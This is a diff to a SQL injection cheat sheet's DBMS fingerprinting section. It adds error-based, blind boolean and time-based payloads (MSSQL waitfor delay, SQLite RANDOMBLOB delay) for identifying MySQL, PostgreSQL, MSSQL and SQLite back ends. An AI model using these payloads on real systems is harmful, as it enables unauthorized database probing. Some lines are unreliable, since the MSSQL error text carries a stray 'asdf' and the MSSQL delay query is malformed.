@@ -304,25 +304,33 @@ oracle> SELECT * FROM all_users
 <br />
 
 ## DBMS Fingerprinting
-#### ___when output of query is showed___ : use environment variable and functions each DBMS support. -> get dbms version
+#### ___when RESULT of QUERY is showed___ : use environment variable and functions each DBMS support. -> get dbms version
 ```sql
 select @@version
 select version()
+sqlite> select sqlite_version();
 ```
-#### ___when error message being printed___ : about error based sqli...
+#### ___when ERROR MESSAGE being printed___ : about error based sqli...
 ```sql
 select 1 union select 1, 2;
 # MySQL => ERROR 1222 (21000): The used SELECT statements have a different number of columns
+# PostgreSQL => ERROR:  each UNION query must have the same number of columns \nLINE 1: select 1 union select 1, 2;
+# MSSQL => Msg 205, Level 16, State 1, Server e2cb36ec2593, Line 1 \nAll queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.asdf
+# SQlite => Error: SELECTs to the left and right of UNION do not have the same number of result columns
 (select * from not_exists_table)
 # SQLite => Error: no such table: not_exists_table
+
 ```
-#### ___when can check boolean output of query___ : about blind sqli... : compare byte by byte
+#### ___when can check BOOLEAN OUTPUT of query___ : about blind sqli... : compare byte by byte
 ```sql
 mid(@@version, 1, 1)='5';
 substr(version(), 1, 1)='P';
+select 1 from {TABLE} where substring(@@version, 1, 1)='M'; #mssql
 ```
 #### ___Exception___ : if not any showing, use time based sqli
 ```sql
 sleep(10)
 pg_sleep(10)
+mssql> select '' if(substring(@@version, 1, 1)='M') waitfor delay '0:0:5'; # mssql : waitfor delay | find first letter 'M'
+sqlite> select case when substr(sqlite_version(), 1, 1)='3' then LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2)))) else 1=1 end; #find first letter '3'
 ```
